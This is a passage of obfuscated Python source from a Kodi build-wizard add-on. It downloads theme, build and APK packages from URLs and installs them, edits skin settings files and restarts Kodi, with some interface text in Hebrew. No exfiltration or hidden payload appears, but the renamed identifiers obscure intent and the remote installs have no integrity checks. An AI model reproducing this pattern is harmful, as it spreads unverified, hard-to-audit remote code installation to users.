			if not O0OOOO00000OO0O0O =='http://'and wiz .workingURL (O0OOOO00000OO0O0O )==True :#line:3771
				OOO0O00000O0OO0OO =wiz .themeCount (O00OOOO00000O00OO ,False )#line:3772
				if len (OOO0O00000O0OO0OO )>0 :#line:3773
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO ,COLOR1 ,len (OOO0O00000O0OO0OO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3774
						wiz .log ("Theme List: %s "%str (OOO0O00000O0OO0OO ))#line:3775
						OO00O0OOO00O0OO0O =DIALOG .select (ADDONTITLE ,OOO0O00000O0OO0OO )#line:3776
						wiz .log ("Theme install selected: %s"%OO00O0OOO00O0OO0O )#line:3777
						if not OO00O0OOO00O0OO0O ==-1 :theme =OOO0O00000O0OO0OO [OO00O0OOO00O0OO0O ];O00OO00OOO00O0000 =True #line:3778
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3779
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3780
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3781
		else :O00OO00OOO00O0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00OOOO00000O00OO ,wiz .checkBuild (O00OOOO00000O00OO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3782
		if O00OO00OOO00O0000 :#line:3783
			O0OOOO000OOOO0O0O =wiz .checkTheme (O00OOOO00000O00OO ,theme ,'url')#line:3784
			OO00OO00OO0O0O00O =O00OOOO00000O00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3785
			if not wiz .workingURL (O0OOOO000OOOO0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3786
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3787
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3788
			O00O000O00O0OOOO0 =os .path .join (PACKAGES ,'%s.zip'%OO00OO00OO0O0O00O )#line:3789
			try :os .remove (O00O000O00O0OOOO0 )#line:3790
			except :pass #line:3791
			downloader .download (O0OOOO000OOOO0O0O ,O00O000O00O0OOOO0 ,DP )#line:3792
			xbmc .sleep (1000 )#line:3793
			DP .update (0 ,"","Installing %s "%O00OOOO00000O00OO )#line:3794
			OOO0O000OOO00OO0O =False #line:3795
			if url not in ["fresh","normal"]:#line:3796
				OOO0O000OOO00OO0O =testTheme (O00O000O00O0OOOO0 )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3797
				OO0O0O00O0O0OOO00 =testGui (O00O000O00O0OOOO0 )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3798
				if OOO0O000OOO00OO0O ==True :#line:3799
					wiz .lookandFeelData ('save')#line:3800
					OOOO00O0O00O00O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3801
					O00O00000OOO0O0OO =xbmc .getSkinDir ()#line:3802
					skinSwitch .swapSkins (OOOO00O0O00O00O0O )#line:3804
					OO000OOO0OOO0O000 =0 #line:3805
					xbmc .sleep (1000 )#line:3806
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO000OOO0OOO0O000 <150 :#line:3807
						OO000OOO0OOO0O000 +=1 #line:3808
						xbmc .sleep (1000 )#line:3809
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3810
						wiz .ebi ('SendClick(11)')#line:3811
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3812
					xbmc .sleep (1000 )#line:3813
			OOOOO0000OO0000OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3814
			DP .update (0 ,OOOOO0000OO0000OO ,'','אנא המתן')#line:3815
			O0O00O0O00OO0O0OO ,OO00O0000OOO0O00O ,OO0O00OO00O0000O0 =extract .all (O00O000O00O0OOOO0 ,HOME ,DP ,title =OOOOO0000OO0000OO )#line:3816
			wiz .setS ('buildtheme',theme )#line:3817
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O00O0O00OO0O0OO ,OO00O0000OOO0O00O ))#line:3818
			DP .close ()#line:3819
			if url not in ["fresh","normal"]:#line:3820
				wiz .forceUpdate ()#line:3821
				if KODIV >=17 :wiz .kodi17Fix ()#line:3822
				if OO0O0O00O0O0OOO00 ==True :#line:3823
					wiz .lookandFeelData ('save')#line:3824
					wiz .defaultSkin ()#line:3825
					O00O00000OOO0O0OO =wiz .getS ('defaultskin')#line:3826
					skinSwitch .swapSkins (O00O00000OOO0O0OO )#line:3827
					OO000OOO0OOO0O000 =0 #line:3828
					xbmc .sleep (1000 )#line:3829
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO000OOO0OOO0O000 <150 :#line:3830
						OO000OOO0OOO0O000 +=1 #line:3831
						xbmc .sleep (1000 )#line:3832
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3834
						wiz .ebi ('SendClick(11)')#line:3835
					wiz .lookandFeelData ('restore')#line:3836
				elif OOO0O000OOO00OO0O ==True :#line:3837
					skinSwitch .swapSkins (O00O00000OOO0O0OO )#line:3838
					OO000OOO0OOO0O000 =0 #line:3839
					xbmc .sleep (1000 )#line:3840
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO000OOO0OOO0O000 <150 :#line:3841
						OO000OOO0OOO0O000 +=1 #line:3842
						xbmc .sleep (1000 )#line:3843
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3845
						wiz .ebi ('SendClick(11)')#line:3846
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3847
					wiz .lookandFeelData ('restore')#line:3848
				else :#line:3849
					wiz .ebi ("ReloadSkin()")#line:3850
					xbmc .sleep (1000 )#line:3851
					wiz .ebi ("Container.Refresh")#line:3852
		else :#line:3853
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3854
def skin_homeselect ():#line:3858
	try :#line:3860
		OOOO0O0O000OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3861
		OO000OO000O0OOO00 =open (OOOO0O0O000OO0OO0 ,'r')#line:3863
		OO0OOO0OO00O0OO00 =OO000OO000O0OOO00 .read ()#line:3864
		OO000OO000O0OOO00 .close ()#line:3865
		OOO00OO00OOOOO00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:3866
		OO000OO00O000O00O =re .compile (OOO00OO00OOOOO00O ).findall (OO0OOO0OO00O0OO00 )[0 ]#line:3867
		OO000OO000O0OOO00 =open (OOOO0O0O000OO0OO0 ,'w')#line:3868
		OO000OO000O0OOO00 .write (OO0OOO0OO00O0OO00 .replace ('<setting id="HomeS" type="string%s/setting>'%OO000OO00O000O00O ,'<setting id="HomeS" type="string"></setting>'))#line:3869
		OO000OO000O0OOO00 .close ()#line:3870
	except :#line:3871
		pass #line:3872
def skin_lower ():#line:3875
	O0OO0OOOO0OO0OO0O =(ADDON .getSetting ("lower"))#line:3876
	if O0OO0OOOO0OO0OO0O =='true':#line:3877
		try :#line:3880
			O0O000000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3881
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'r')#line:3883
			OO0OO0OOOOO0OOO00 =O00OO0OO00O00O0O0 .read ()#line:3884
			O00OO0OO00O00O0O0 .close ()#line:3885
			OOO0O0O0O0OOO00OO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3886
			O0000000OOO000OO0 =re .compile (OOO0O0O0O0OOO00OO ).findall (OO0OO0OOOOO0OOO00 )[0 ]#line:3887
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'w')#line:3888
			O00OO0OO00O00O0O0 .write (OO0OO0OOOOO0OOO00 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0000000OOO000OO0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:3889
			O00OO0OO00O00O0O0 .close ()#line:3890
			O0O000000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3892
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'r')#line:3894
			OO0OO0OOOOO0OOO00 =O00OO0OO00O00O0O0 .read ()#line:3895
			O00OO0OO00O00O0O0 .close ()#line:3896
			OOO0O0O0O0OOO00OO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3897
			O0000000OOO000OO0 =re .compile (OOO0O0O0O0OOO00OO ).findall (OO0OO0OOOOO0OOO00 )[0 ]#line:3898
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'w')#line:3899
			O00OO0OO00O00O0O0 .write (OO0OO0OOOOO0OOO00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0000000OOO000OO0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3900
			O00OO0OO00O00O0O0 .close ()#line:3901
			O0O000000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3903
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'r')#line:3905
			OO0OO0OOOOO0OOO00 =O00OO0OO00O00O0O0 .read ()#line:3906
			O00OO0OO00O00O0O0 .close ()#line:3907
			OOO0O0O0O0OOO00OO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3908
			O0000000OOO000OO0 =re .compile (OOO0O0O0O0OOO00OO ).findall (OO0OO0OOOOO0OOO00 )[0 ]#line:3909
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'w')#line:3910
			O00OO0OO00O00O0O0 .write (OO0OO0OOOOO0OOO00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0000000OOO000OO0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:3911
			O00OO0OO00O00O0O0 .close ()#line:3912
			O0O000000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3916
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'r')#line:3918
			OO0OO0OOOOO0OOO00 =O00OO0OO00O00O0O0 .read ()#line:3919
			O00OO0OO00O00O0O0 .close ()#line:3920
			OOO0O0O0O0OOO00OO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:3921
			O0000000OOO000OO0 =re .compile (OOO0O0O0O0OOO00OO ).findall (OO0OO0OOOOO0OOO00 )[0 ]#line:3922
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'w')#line:3923
			O00OO0OO00O00O0O0 .write (OO0OO0OOOOO0OOO00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0000000OOO000OO0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:3924
			O00OO0OO00O00O0O0 .close ()#line:3925
			O0O000000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3929
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'r')#line:3931
			OO0OO0OOOOO0OOO00 =O00OO0OO00O00O0O0 .read ()#line:3932
			O00OO0OO00O00O0O0 .close ()#line:3933
			OOO0O0O0O0OOO00OO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:3934
			O0000000OOO000OO0 =re .compile (OOO0O0O0O0OOO00OO ).findall (OO0OO0OOOOO0OOO00 )[0 ]#line:3935
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'w')#line:3936
			O00OO0OO00O00O0O0 .write (OO0OO0OOOOO0OOO00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0000000OOO000OO0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:3937
			O00OO0OO00O00O0O0 .close ()#line:3938
			O0O000000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3942
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'r')#line:3944
			OO0OO0OOOOO0OOO00 =O00OO0OO00O00O0O0 .read ()#line:3945
			O00OO0OO00O00O0O0 .close ()#line:3946
			OOO0O0O0O0OOO00OO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:3947
			O0000000OOO000OO0 =re .compile (OOO0O0O0O0OOO00OO ).findall (OO0OO0OOOOO0OOO00 )[0 ]#line:3948
			O00OO0OO00O00O0O0 =open (O0O000000000OOO00 ,'w')#line:3949
			O00OO0OO00O00O0O0 .write (OO0OO0OOOOO0OOO00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0000000OOO000OO0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:3950
			O00OO0OO00O00O0O0 .close ()#line:3951
		except :#line:3956
			pass #line:3957
def thirdPartyInstall (OO00OOOOO0O000OO0 ,OO0OOO0O00OOOOO0O ):#line:3959
	if not wiz .workingURL (OO0OOO0O00OOOOO0O ):#line:3960
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:3961
	O00OOOO0O0O0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOOO0O000OO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:3962
	if O00OOOO0O0O0OO00O ==1 :#line:3963
		freshStart ('third',True )#line:3964
	wiz .clearS ('build')#line:3965
	O00OOOOOOO00OO0OO =OO00OOOOO0O000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3966
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3967
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO0O000OO0 ),'','אנא המתן')#line:3968
	OO0O0OOO000OOO0O0 =os .path .join (PACKAGES ,'%s.zip'%O00OOOOOOO00OO0OO )#line:3969
	try :os .remove (OO0O0OOO000OOO0O0 )#line:3970
	except :pass #line:3971
	downloader .download (OO0OOO0O00OOOOO0O ,OO0O0OOO000OOO0O0 ,DP )#line:3972
	xbmc .sleep (1000 )#line:3973
	OO0O00000O00OO000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO0O000OO0 )#line:3974
	DP .update (0 ,OO0O00000O00OO000 ,'','אנא המתן')#line:3975
	OO00OO00O0OO00O00 ,OOOO00000000O0000 ,OOO0O00OO00O0OO00 =extract .all (OO0O0OOO000OOO0O0 ,HOME ,DP ,title =OO0O00000O00OO000 )#line:3976
	if int (float (OO00OO00O0OO00O00 ))>0 :#line:3977
		wiz .fixmetas ()#line:3978
		wiz .lookandFeelData ('save')#line:3979
		wiz .defaultSkin ()#line:3980
		wiz .setS ('installed','true')#line:3982
		wiz .setS ('extract',str (OO00OO00O0OO00O00 ))#line:3983
		wiz .setS ('errors',str (OOOO00000000O0000 ))#line:3984
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00OO00O0OO00O00 ,OOOO00000000O0000 ))#line:3985
		try :os .remove (OO0O0OOO000OOO0O0 )#line:3986
		except :pass #line:3987
		if int (float (OOOO00000000O0000 ))>0 :#line:3988
			O0OOO0O0OOOOO0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO0O000OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00OO00O0OO00O00 ,'%',COLOR1 ,OOOO00000000O0000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3989
			if O0OOO0O0OOOOO0O0O :#line:3990
				if isinstance (OOOO00000000O0000 ,unicode ):#line:3991
					OOO0O00OO00O0OO00 =OOO0O00OO00O0OO00 .encode ('utf-8')#line:3992
				wiz .TextBox (ADDONTITLE ,OOO0O00OO00O0OO00 )#line:3993
	DP .close ()#line:3994
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3995
	if INSTALLMETHOD ==1 :OO0OOOOO0O000OO00 =1 #line:3996
	elif INSTALLMETHOD ==2 :OO0OOOOO0O000OO00 =0 #line:3997
	else :OO0OOOOO0O000OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:3998
	if OO0OOOOO0O000OO00 ==1 :wiz .reloadFix ()#line:3999
	else :wiz .killxbmc (True )#line:4000
def testTheme (OO0OOO00OOO00OO00 ):#line:4002
	OO0O0O0OO0OO00000 =zipfile .ZipFile (OO0OOO00OOO00OO00 )#line:4003
	for OOO000O000OO0O0OO in OO0O0O0OO0OO00000 .infolist ():#line:4004
		if '/settings.xml'in OOO000O000OO0O0OO .filename :#line:4005
			return True #line:4006
	return False #line:4007
def testGui (O0OOOO0O0000OO00O ):#line:4009
	OO0OOO0OO00OOO0OO =zipfile .ZipFile (O0OOOO0O0000OO00O )#line:4010
	for O0O0OOO0OOO00O00O in OO0OOO0OO00OOO0OO .infolist ():#line:4011
		if '/guisettings.xml'in O0O0OOO0OOO00O00O .filename :#line:4012
			return True #line:4013
	return False #line:4014
def apkInstaller (OO000O0OO0OO0OOO0 ,OO0O0OO00O00O0O0O ):#line:4016
	wiz .log (OO000O0OO0OO0OOO0 )#line:4017
	wiz .log (OO0O0OO00O00O0O0O )#line:4018
	if wiz .platform ()=='android':#line:4019
		O00000O00000O00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0OO0OO0OOO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4020
		if not O00000O00000O00OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4021
		O00O00OO0O0O0000O =OO000O0OO0OO0OOO0 #line:4022
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4023
		if not wiz .workingURL (OO0O0OO00O00O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4024
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00OO0O0O0000O ),'','אנא המתן')#line:4025
		OO0OO0O00OOOOOOO0 =os .path .join (PACKAGES ,"%s.apk"%OO000O0OO0OO0OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4026
		try :os .remove (OO0OO0O00OOOOOOO0 )#line:4027
		except :pass #line:4028
		downloader .download (OO0O0OO00O00O0O0O ,OO0OO0O00OOOOOOO0 ,DP )#line:4029
		xbmc .sleep (100 )#line:4030
		DP .close ()#line:4031
		notify .apkInstaller (OO000O0OO0OO0OOO0 )#line:4032
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0OO0O00OOOOOOO0 +'")')#line:4033
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4034
def createMenu (O0OOO000OOOOOO00O ,O0OOOO0OO0O00000O ,OOO0O00OO0000OOO0 ):#line:4040
	if O0OOO000OOOOOO00O =='saveaddon':#line:4041
		OOO0OOO000O00O0OO =[]#line:4042
		O0000OO000OO00OO0 =urllib .quote_plus (O0OOOO0OO0O00000O .lower ().replace (' ',''))#line:4043
		OOOO0OOO0000OO0O0 =O0OOOO0OO0O00000O .replace ('Debrid','Real Debrid')#line:4044
		OOO000000O0O0O0O0 =urllib .quote_plus (OOO0O00OO0000OOO0 .lower ().replace (' ',''))#line:4045
		OOO0O00OO0000OOO0 =OOO0O00OO0000OOO0 .replace ('url','URL Resolver')#line:4046
		OOO0OOO000O00O0OO .append ((THEME2 %OOO0O00OO0000OOO0 .title (),' '))#line:4047
		OOO0OOO000O00O0OO .append ((THEME3 %'Save %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4048
		OOO0OOO000O00O0OO .append ((THEME3 %'Restore %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4049
		OOO0OOO000O00O0OO .append ((THEME3 %'Clear %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4050
	elif O0OOO000OOOOOO00O =='save':#line:4051
		OOO0OOO000O00O0OO =[]#line:4052
		O0000OO000OO00OO0 =urllib .quote_plus (O0OOOO0OO0O00000O .lower ().replace (' ',''))#line:4053
		OOOO0OOO0000OO0O0 =O0OOOO0OO0O00000O .replace ('Debrid','Real Debrid')#line:4054
		OOO000000O0O0O0O0 =urllib .quote_plus (OOO0O00OO0000OOO0 .lower ().replace (' ',''))#line:4055
		OOO0O00OO0000OOO0 =OOO0O00OO0000OOO0 .replace ('url','URL Resolver')#line:4056
		OOO0OOO000O00O0OO .append ((THEME2 %OOO0O00OO0000OOO0 .title (),' '))#line:4057
		OOO0OOO000O00O0OO .append ((THEME3 %'Register %s'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4058
		OOO0OOO000O00O0OO .append ((THEME3 %'Save %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4059
		OOO0OOO000O00O0OO .append ((THEME3 %'Restore %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4060
		OOO0OOO000O00O0OO .append ((THEME3 %'Import %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4061
		OOO0OOO000O00O0OO .append ((THEME3 %'Clear Addon %s Data'%OOOO0OOO0000OO0O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0000OO000OO00OO0 ,OOO000000O0O0O0O0 )))#line:4062
	elif O0OOO000OOOOOO00O =='install':#line:4063
		OOO0OOO000O00O0OO =[]#line:4064
		OOO000000O0O0O0O0 =urllib .quote_plus (OOO0O00OO0000OOO0 )#line:4065
		OOO0OOO000O00O0OO .append ((THEME2 %OOO0O00OO0000OOO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOO000000O0O0O0O0 )))#line:4066
		OOO0OOO000O00O0OO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOO000000O0O0O0O0 )))#line:4067
		OOO0OOO000O00O0OO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOO000000O0O0O0O0 )))#line:4068
		OOO0OOO000O00O0OO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOO000000O0O0O0O0 )))#line:4069
		OOO0OOO000O00O0OO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOO000000O0O0O0O0 )))#line:4070
	OOO0OOO000O00O0OO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4071
	return OOO0OOO000O00O0OO #line:4072
def toggleCache (O00O00O0OO00O0000 ):#line:4074
	O0O0O000OO0O00000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4075
	OOOO0OO0OOO0OOOO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4076
	if O00O00O0OO00O0000 in ['true','false']:#line:4077
		for OO0OO0OO0000O000O in O0O0O000OO0O00000 :#line:4078
			wiz .setS (OO0OO0OO0000O000O ,O00O00O0OO00O0000 )#line:4079
	else :#line:4080
		if not O00O00O0OO00O0000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4081
			try :#line:4082
				OO0OO0OO0000O000O =OOOO0OO0OOO0OOOO0 [O0O0O000OO0O00000 .index (O00O00O0OO00O0000 )]#line:4083
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0OO0OO0000O000O ))#line:4084
			except :#line:4085
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O00O00O0OO00O0000 ))#line:4086
		else :#line:4087
			OO00OO00O0OOO00OO ='true'if wiz .getS (O00O00O0OO00O0000 )=='false'else 'false'#line:4088
			wiz .setS (O00O00O0OO00O0000 ,OO00OO00O0OOO00OO )#line:4089
def playVideo (OO0OO0OO00O0OOO0O ):#line:4091
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0OO0OO00O0OOO0O )#line:4092
	if 'watch?v='in OO0OO0OO00O0OOO0O :#line:4093
		O0O0OOOO00000O000 ,O0O0OOO00O0O0O000 =OO0OO0OO00O0OOO0O .split ('?')#line:4094
		O0OOOOOO0000000OO =O0O0OOO00O0O0O000 .split ('&')#line:4095
		for O0000OOO00OO00O00 in O0OOOOOO0000000OO :#line:4096
			if O0000OOO00OO00O00 .startswith ('v='):#line:4097
				OO0OO0OO00O0OOO0O =O0000OOO00OO00O00 [2 :]#line:4098
				break #line:4099
			else :continue #line:4100
	elif 'embed'in OO0OO0OO00O0OOO0O or 'youtu.be'in OO0OO0OO00O0OOO0O :#line:4101
